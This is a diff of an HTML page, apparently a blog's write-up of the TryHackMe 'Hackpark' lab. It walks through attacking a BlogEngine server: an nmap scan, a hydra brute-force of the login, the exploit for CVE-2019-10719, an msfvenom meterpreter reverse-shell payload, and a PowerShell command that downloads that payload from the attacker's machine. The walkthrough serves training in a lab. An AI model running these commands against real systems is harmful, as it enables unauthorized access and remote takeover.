@@ -6,14 +6,13 @@
 <title>THM Hackpark</title>
 <meta name="author" content="Lamprinos Chatziioannou" />
 <meta name="generator" content="Org Mode" />
-<link rel="preconnect" href="https://fonts.googleapis.com"> <link href="https://fonts.googleapis.com/css2?family=Fira+Sans&display=swap" rel="stylesheet"> <link href="https://fonts.googleapis.com/css2?family=Roboto+Condensed&display=swap" rel="stylesheet"> <script src="https://cdn.jsdelivr.net/gh/oyvindstegard/ox-tagfilter-js/ox-tagfilter.js"></script> <link rel="stylesheet" href="/src/rougier.css" /> <script src="/src/copy-pre.js"></script> <link rel="icon" type="image/x-icon" href="/src/favicon.ico"> <meta charset="UTF-8" name="viewport" content="width=device-width, initial-scale=1.0"> <!-- Google tag (gtag.js) --> <script async src="https://www.googletagmanager.com/gtag/js?id=G-55X4GXWBKS"></script> <script> window.dataLayer = window.dataLayer || []; function gtag(){dataLayer.push(arguments);} gtag('js', new Date()); gtag('config', 'G-55X4GXWBKS'); </script><script src="https://kit.fontawesome.com/78d5a086dd.js" crossorigin="anonymous"></script>
+<link rel="preconnect" href="https://fonts.googleapis.com"> <link href="https://fonts.googleapis.com/css2?family=Fira+Sans&display=swap" rel="stylesheet"> <link href="https://fonts.googleapis.com/css2?family=Roboto+Condensed&display=swap" rel="stylesheet"> <link href="https://fonts.googleapis.com/css2?family=Roboto+Mono&display=swap" rel="stylesheet"> <script src="https://cdn.jsdelivr.net/gh/oyvindstegard/ox-tagfilter-js/ox-tagfilter.js"></script> <link rel="stylesheet" href="/src/rougier.min.css" /> <script src="/src/copy-pre.min.js"></script> <script src="/src/theme-switcher.min.js" defer></script> <link rel="icon" type="image/x-icon" href="/src/favicon.ico"> <meta charset="UTF-8" name="viewport" content="width=device-width, initial-scale=1.0"> <!-- Google tag (gtag.js) --> <script async src="https://www.googletagmanager.com/gtag/js?id=G-55X4GXWBKS"></script> <script> window.dataLayer = window.dataLayer || []; function gtag(){dataLayer.push(arguments);} gtag('js', new Date()); gtag('config', 'G-55X4GXWBKS'); </script><script src="https://kit.fontawesome.com/78d5a086dd.js" crossorigin="anonymous"></script>
 </head>
 <body>
-<div id="org-div-home-and-up">
- <a accesskey="h" href="./index.html"> UP </a>
- |
- <a accesskey="H" href="/index.html"> HOME </a>
-</div><div id="content" class="content">
+<div id="preamble" class="status">
+<div id="org-div-home-and-up"><a accesskey="H" href="/index.html"> HOME </a> | <button id="theme-toggle" title="Toggle theme">🌓</button></div>
+</div>
+<div id="content" class="content">
 <h1 class="title">THM Hackpark
 <br>
 <span class="subtitle">Back Again</span>
@@ -22,19 +21,19 @@
 <h2>Table of Contents</h2>
 <div id="text-table-of-contents" role="doc-toc">
 <ul>
-<li><a href="#org672ef53">Recon</a>
+<li><a href="#orgfd5ce1c">Recon</a>
 <ul>
-<li><a href="#org97a0124">Visiting the WebServer</a></li>
+<li><a href="#orgb23b07d">Visiting the WebServer</a></li>
 </ul>
 </li>
-<li><a href="#org429cfb4">Bruteforcing the website log in</a></li>
-<li><a href="#org719fa6b">Exploiting BlogEngine</a></li>
-<li><a href="#org3d78926">PrivEsc</a>
+<li><a href="#orga950b6a">Bruteforcing the website log in</a></li>
+<li><a href="#orgb994541">Exploiting BlogEngine</a></li>
+<li><a href="#org9f79691">PrivEsc</a>
 <ul>
-<li><a href="#org1c70c1a">Meterpreter</a></li>
+<li><a href="#org50f7809">Meterpreter</a></li>
 </ul>
 </li>
-<li><a href="#org5097b7f">Conclusion</a></li>
+<li><a href="#org94d510c">Conclusion</a></li>
 </ul>
 </div>
 </div>
@@ -50,10 +49,9 @@ let&rsquo;s dive right in.
 After using the good ol trick of modifying <code>/etc/hosts</code> and <code>.bashrc</code> for
 easier handling of the remote machine&rsquo;s address:
 </p>
-
-<div id="outline-container-org672ef53" class="outline-2">
-<h2 id="org672ef53"><a href="#org672ef53">Recon</a></h2>
-<div class="outline-text-2" id="text-org672ef53">
+<div id="outline-container-orgfd5ce1c" class="outline-2">
+<h2 id="orgfd5ce1c"><a href="#orgfd5ce1c">Recon</a></h2>
+<div class="outline-text-2" id="text-orgfd5ce1c">
 <p>
 Our initial port scan only shows 2 open ports:
 </p>
@@ -63,7 +61,7 @@ Our initial port scan only shows 2 open ports:
 results suggest may be an RDP entry point)</li>
 </ul>
 <div class="org-src-container">
-<pre class="src src-bash" id="orgaae9ae6">nmap -sV -sC -oN nmap.initial $<span class="org-variable-name">IP</span>
+<pre class="src src-bash" id="org3dca031">nmap -sV -sC -oN nmap.initial $<span class="org-variable-name">IP</span>
 </pre>
 </div>
 
@@ -76,10 +74,9 @@ revealed:
 <li class="off"><code>[&#xa0;]</code> 5985: wsman</li>
 </ul>
 </div>
-
-<div id="outline-container-org97a0124" class="outline-3">
-<h3 id="org97a0124"><a href="#org97a0124">Visiting the WebServer</a></h3>
-<div class="outline-text-3" id="text-org97a0124">
+<div id="outline-container-orgb23b07d" class="outline-3">
+<h3 id="orgb23b07d"><a href="#orgb23b07d">Visiting the WebServer</a></h3>
+<div class="outline-text-3" id="text-orgb23b07d">
 <p>
 The website is powered by <code>BlogEngine</code>, with numerous exploits readily
 available for certain versions of it in exploitdb.
@@ -88,7 +85,7 @@ available for certain versions of it in exploitdb.
 <p>
 <code>robots.txt</code> has some nice directories:
 </p>
-<pre class="example" id="org83b3643">
+<pre class="example" id="orgb8943c0">
 User-agent: *
 Disallow: /Account/*.*
 Disallow: /search
@@ -102,7 +99,7 @@ Disallow: /archive.aspx
 We have a contact form, so a XSS vulnerability could (maybe) be used
 </p>
 
-<div id="orga4b366f" class="figure">
+<div id="orgce9a5a0" class="figure">
 <p><img src="images/Recon/20231215_000936_screenshot.png" alt="20231215_000936_screenshot.png">
 </p>
 <p><span class="figure-number">Figure 1: </span>Contact form</p>
@@ -112,7 +109,7 @@ We have a contact form, so a XSS vulnerability could (maybe) be used
 We also have a log in form:
 </p>
 
-<div id="org276fe84" class="figure">
+<div id="orgf3c3dee" class="figure">
 <p><img src="images/Recon/20231215_001129_screenshot.png" alt="20231215_001129_screenshot.png">
 </p>
 <p><span class="figure-number">Figure 2: </span>Log in form</p>
@@ -126,10 +123,9 @@ am looking at.
 </div>
 </div>
 </div>
-
-<div id="outline-container-org429cfb4" class="outline-2">
-<h2 id="org429cfb4"><a href="#org429cfb4">Bruteforcing the website log in</a></h2>
-<div class="outline-text-2" id="text-org429cfb4">
+<div id="outline-container-orga950b6a" class="outline-2">
+<h2 id="orga950b6a"><a href="#orga950b6a">Bruteforcing the website log in</a></h2>
+<div class="outline-text-2" id="text-orga950b6a">
 <p>
 After redirecting my web traffic to burp, so that I can better see how
 my post requests are structured, it becomes apparrent that there is a
@@ -137,7 +133,7 @@ set of parameters (other than just username and password) I need to
 set:
 </p>
 
-<pre class="example" id="org5fa88e4">
+<pre class="example" id="org7020dda">
 __VIEWSTATE=UnGFJ1jVBCvPEJB6QrtoKjw76I1fof5nb5%2Fmi95M3Edq9I%2FyqWIy2X2%2FvU7Ag6VZLp%2BYaqmf9yb4caypLwuCdNI3qKUNzyfXiyfNXj5EpuJ0v1Bx%2BnUjl%2FYd9ar9Tb8f3nFwQNVJA6mndKa3dsYvFzu1Bexhhxrqz1chJpeI3L3asy8n&amp;__EVENTVALIDATION=EAe%2B9Chaa4KVFKEQmsprctI7ZIULtNtcD5gfs0zaO0eCbHDdIzjkiO%2BL%2F06nRadcC4cNF5UU3h7kFR%2BmxGwEyb8LufjLU1PJZ9wMrll%2FbVKtVQVrulxrJ3RbExWazKFa8xYTlGU2rrsOcv46foitShidjkUpCxSflIsV3F5p6KrgzjkM&amp;ctl00%24MainContent%24LoginUser%24UserName=^USER^&amp;ctl00%24MainContent%24LoginUser%24Password=^PASS^&amp;ctl00%24MainContent%24LoginUser%24LoginButton=Log+in
 </pre>
 
@@ -147,7 +143,7 @@ path <code>/Account/login.aspx</code> and failed login attempts had <code>Login 
 I structured the following hydra command:
 </p>
 <div class="org-src-container">
-<pre class="src src-bash" id="org49597ed">hydra -l admin -P /usr/share/wordlists/rockyou.txt hackpark.thm http-post-form <span class="org-string">"/Account/login.aspx:__VIEWSTATE=UnGFJ1jVBCvPEJB6QrtoKjw76I1fof5nb5%2Fmi95M3Edq9I%2FyqWIy2X2%2FvU7Ag6VZLp%2BYaqmf9yb4caypLwuCdNI3qKUNzyfXiyfNXj5EpuJ0v1Bx%2BnUjl%2FYd9ar9Tb8f3nFwQNVJA6mndKa3dsYvFzu1Bexhhxrqz1chJpeI3L3asy8n&amp;__EVENTVALIDATION=EAe%2B9Chaa4KVFKEQmsprctI7ZIULtNtcD5gfs0zaO0eCbHDdIzjkiO%2BL%2F06nRadcC4cNF5UU3h7kFR%2BmxGwEyb8LufjLU1PJZ9wMrll%2FbVKtVQVrulxrJ3RbExWazKFa8xYTlGU2rrsOcv46foitShidjkUpCxSflIsV3F5p6KrgzjkM&amp;ctl00%24MainContent%24LoginUser%24UserName=^USER^&amp;ctl00%24MainContent%24LoginUser%24Password=^PASS^&amp;ctl00%24MainContent%24LoginUser%24LoginButton=Log+in:Login failed"</span> 
+<pre class="src src-bash" id="org84b8271">hydra -l admin -P /usr/share/wordlists/rockyou.txt hackpark.thm http-post-form <span class="org-string">"/Account/login.aspx:__VIEWSTATE=UnGFJ1jVBCvPEJB6QrtoKjw76I1fof5nb5%2Fmi95M3Edq9I%2FyqWIy2X2%2FvU7Ag6VZLp%2BYaqmf9yb4caypLwuCdNI3qKUNzyfXiyfNXj5EpuJ0v1Bx%2BnUjl%2FYd9ar9Tb8f3nFwQNVJA6mndKa3dsYvFzu1Bexhhxrqz1chJpeI3L3asy8n&amp;__EVENTVALIDATION=EAe%2B9Chaa4KVFKEQmsprctI7ZIULtNtcD5gfs0zaO0eCbHDdIzjkiO%2BL%2F06nRadcC4cNF5UU3h7kFR%2BmxGwEyb8LufjLU1PJZ9wMrll%2FbVKtVQVrulxrJ3RbExWazKFa8xYTlGU2rrsOcv46foitShidjkUpCxSflIsV3F5p6KrgzjkM&amp;ctl00%24MainContent%24LoginUser%24UserName=^USER^&amp;ctl00%24MainContent%24LoginUser%24Password=^PASS^&amp;ctl00%24MainContent%24LoginUser%24LoginButton=Log+in:Login failed"</span> 
 </pre>
 </div>
 
@@ -156,10 +152,9 @@ After waiting for some time, it gave us the password.
 </p>
 </div>
 </div>
-
-<div id="outline-container-org719fa6b" class="outline-2">
-<h2 id="org719fa6b"><a href="#org719fa6b">Exploiting BlogEngine</a></h2>
-<div class="outline-text-2" id="text-org719fa6b">
+<div id="outline-container-orgb994541" class="outline-2">
+<h2 id="orgb994541"><a href="#orgb994541">Exploiting BlogEngine</a></h2>
+<div class="outline-text-2" id="text-orgb994541">
 <p>
 Seeing that BlogEngine had some exploits available, I immediately
 searched for the currently running version, (available in the <code>about</code>
@@ -167,7 +162,7 @@ pane).
 </p>
 
 
-<div id="orge712f1c" class="figure">
+<div id="org1ef069f" class="figure">
 <p><img src="images/Exploiting_BlogEngine/20231215_003106_screenshot.png" alt="20231215_003106_screenshot.png">
 </p>
 <p><span class="figure-number">Figure 3: </span>Blog Engine Version</p>
@@ -179,7 +174,7 @@ available python scripts for us to use (much better than the manual
 alternative :P ):
 </p>
 
-<pre class="example" id="orgcc188c2">
+<pre class="example" id="org6fb7f10">
 BlogEngine.NET 3.3.6/3.3.7 - 'dirPath' Direct | aspx/webapps/47010.py
 BlogEngine.NET 3.3.6/3.3.7 - 'theme Cookie' D | aspx/webapps/47011.py
 </pre>
@@ -190,7 +185,7 @@ same author and essentially have a similar behavior. I decided to go
 with the first one.
 </p>
 
-<pre class="example" id="orgb70eaa9">
+<pre class="example" id="org6b115ff">
 Exploit for CVE-2019-10719
 
 CVE Identified by: Aaron Bishop
@@ -210,7 +205,7 @@ This, taken from the exploit file (obviously), served as the basis for
 the following command
 </p>
 <div class="org-src-container">
-<pre class="src src-bash" id="org5912a4d">searchsploit -m 47010 <span class="org-comment-delimiter"># </span><span class="org-comment">this might be just the most beautiful option in searchsploit, which I had *totally* missed for quite a long time</span>
+<pre class="src src-bash" id="orgfa7c2d3">searchsploit -m 47010 <span class="org-comment-delimiter"># </span><span class="org-comment">this might be just the most beautiful option in searchsploit, which I had *totally* missed for quite a long time</span>
 python 47010.py -t hackpark.thm -l 10.10.93.209:6969 -u admin -p 1qaz2wsx
 </pre>
 </div>
@@ -224,7 +219,7 @@ nice reverse shell.
 
 
 
-<div id="orgf0f3f4c" class="figure">
+<div id="org999d500" class="figure">
 <p><img src="images/Exploiting_BlogEngine/20231215_004446_screenshot.png" alt="20231215_004446_screenshot.png">
 </p>
 <p><span class="figure-number">Figure 4: </span>Initial Foothold</p>
@@ -237,24 +232,22 @@ getting a meterpreter shell, there is no need for manual priv esc.
 </p>
 </div>
 </div>
-
-<div id="outline-container-org3d78926" class="outline-2">
-<h2 id="org3d78926"><a href="#org3d78926">PrivEsc</a></h2>
-<div class="outline-text-2" id="text-org3d78926">
+<div id="outline-container-org9f79691" class="outline-2">
+<h2 id="org9f79691"><a href="#org9f79691">PrivEsc</a></h2>
+<div class="outline-text-2" id="text-org9f79691">
 <p>
 This section could be called &ldquo;getting the flags&rdquo;, because I do not
 believe that I would go 
 </p>
 </div>
-
-<div id="outline-container-org1c70c1a" class="outline-3">
-<h3 id="org1c70c1a"><a href="#org1c70c1a">Meterpreter</a></h3>
-<div class="outline-text-3" id="text-org1c70c1a">
+<div id="outline-container-org50f7809" class="outline-3">
+<h3 id="org50f7809"><a href="#org50f7809">Meterpreter</a></h3>
+<div class="outline-text-3" id="text-org50f7809">
 <p>
 First things first, generating and uploading the payload to the target
 host:
 </p>
-<pre class="example" id="orgd11305a">
+<pre class="example" id="org71ed525">
 root@ip-10-10-93-209:~# msfvenom -p windows/x64/meterpreter/reverse_tcp -f exe -o shell.exe LHOST=10.10.93.209 LPORT=6970
 [-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
 [-] No arch selected, selecting arch: x64 from the payload
@@ -281,12 +274,12 @@ in that position make sure that you are smarter than me: pressing
 https instead of http by habit.
 </p>
 
-<pre class="example" id="org5f32dbe">
+<pre class="example" id="org077d9b8">
 powershell -c "Invoke-WebRequest -Uri 'http://10.10.93.209:8000/shell.exe' -OutFile 'c:\Windows\Temp\shell.exe'"
 </pre>
 
 
-<div id="orgbbea2fa" class="figure">
+<div id="orgc9bd415" class="figure">
 <p><img src="images/PrivEsc/20231215_012431_screenshot.png" alt="20231215_012431_screenshot.png">
 </p>
 <p><span class="figure-number">Figure 5: </span>Meterpreter</p>
@@ -311,11 +304,9 @@ session. Maybe next time.
 </div>
 </div>
 </div>
-
-
-<div id="outline-container-org5097b7f" class="outline-2">
-<h2 id="org5097b7f"><a href="#org5097b7f">Conclusion</a></h2>
-<div class="outline-text-2" id="text-org5097b7f">
+<div id="outline-container-org94d510c" class="outline-2">
+<h2 id="org94d510c"><a href="#org94d510c">Conclusion</a></h2>
+<div class="outline-text-2" id="text-org94d510c">
 <p>
 I will focus on getting some more experience with windows, at least on
 a theoretical level, and populating my notes better, because I think
